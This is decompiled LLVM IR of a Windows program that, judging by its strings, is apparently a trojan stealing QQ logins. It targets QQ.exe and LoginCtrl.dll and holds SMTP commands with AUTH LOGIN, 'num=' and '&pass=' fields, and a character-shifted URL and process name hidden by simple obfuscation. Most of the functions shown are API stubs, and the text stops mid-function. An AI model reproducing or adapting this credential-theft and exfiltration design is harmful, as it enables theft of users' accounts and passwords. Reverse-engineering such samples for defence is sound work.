source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_406604 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406610 = constant i32 47
@global_var_406650 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_40665c = constant [5 x i8] c"num=\00"
@global_var_40666c = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_40667c = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0uftu0ofx=btq\00"
@global_var_406754 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406764 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406874 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406884 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_40688c = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406b00 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406b14 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406b20 = local_unnamed_addr constant i32 47
@global_var_40690c = local_unnamed_addr constant i32 4221200
@global_var_406910 = local_unnamed_addr constant i32 841875985
@global_var_406c40 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406c54 = constant i32 47
@global_var_406c60 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_407238 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_4072e4 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_40746c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_407478 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_407958 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40797c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_407a10 = constant [11 x i8] c"user32.dll\00"
@global_var_407a1c = constant [11 x i8] c"LoadImageA\00"
@global_var_407a28 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407608 = local_unnamed_addr constant i32 4224596
@global_var_407654 = local_unnamed_addr constant i32 1867011080
@global_var_407a38 = constant [12 x i8] c"LoadStringA\00"
@global_var_407a44 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_407a50 = constant [12 x i8] c"shell32.dll\00"
@global_var_407a5c = constant [14 x i8] c"ShellExecuteA\00"
@global_var_407a6c = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_4096f8 = local_unnamed_addr global i32 0
@global_var_407b40 = local_unnamed_addr constant i32 31
@global_var_409808 = local_unnamed_addr global i32 0
@global_var_407ee8 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_407ef8 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407f10 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407f28 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407f38 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407f48 = constant [8 x i8] c"ListBox\00"
@global_var_40980c = global i32 0
@global_var_407f58 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096fc = external global i8*

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
